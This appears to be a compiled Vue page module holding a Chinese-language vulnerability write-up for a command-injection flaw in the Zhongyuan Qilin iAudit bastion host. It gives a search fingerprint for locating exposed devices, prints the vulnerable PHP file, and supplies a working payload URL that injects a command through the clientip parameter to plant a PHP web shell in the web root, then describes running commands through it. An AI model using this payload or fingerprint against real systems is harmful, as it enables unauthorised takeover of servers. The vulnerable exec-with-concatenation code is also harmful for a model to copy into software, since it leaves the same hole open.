import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const t={},s=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>中远麒麟 iAudit堡垒机 get_luser_by_sshport.php文件存在命令拼接，攻击者通过漏洞可获取服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>中远麒麟 iAudit堡垒机
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>cert.subject=&quot;Baolei&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251002739.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>出现漏洞的文件为 get_luser_by_sshport.php</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php
define(&#39;CAN_RUN&#39;, 1);
require_once(&#39;include/global.func.php&#39;);
require_once(&#39;include/db_connect.inc.php&#39;);
if(empty($_GET[&#39;clientip&#39;])){
	echo &#39;no host&#39;;
	return;
}
if(empty($_GET[&#39;clientport&#39;])){
	echo &#39;no port&#39;;
	return;
}
$cmd = &#39;sudo perl test.pl &#39;.$_GET[&#39;clientip&#39;].&#39; &#39;.$_GET[&#39;clientport&#39;];
exec($cmd, $o, $r);
 $sql = &quot;SELECT luser FROM sessions WHERE addr=&#39;&quot;.$_GET[&#39;clientip&#39;].&quot;&#39; and pid=&#39;&quot;.$o[0].&quot;&#39; order by sid desc limit 1&quot;;
$rs = mysql_query($sql);
$row = mysql_fetch_array($rs);
echo $row[&#39;luser&#39;];
?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中 clientip存在命令拼接 使用 ; 分割命令就可以执行任意命令</p><p>Web目录默认为 <code>/opt/freesvr/web/htdocs/freesvr/audit/</code></p><p>发送Payload</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>https://xxx.xxx.xxx.xxx/get_luser_by_sshport.php?clientip=1;echo+%27%3C?php%20var_dump(shell_exec($_GET[cmd]));?%3E%27%3E/opt/freesvr/web/htdocs/freesvr/audit/test.php;&amp;clientport=1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251003398.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>再访问写入的文件执行命令</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251003445.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,18),d=[s];function r(l,c){return i(),n("div",null,d)}const u=e(t,[["render",r],["__file","中远麒麟 iAudit堡垒机 get_luser_by_sshport.php 远程命令执行漏洞.html.vue"]]);export{u as default};
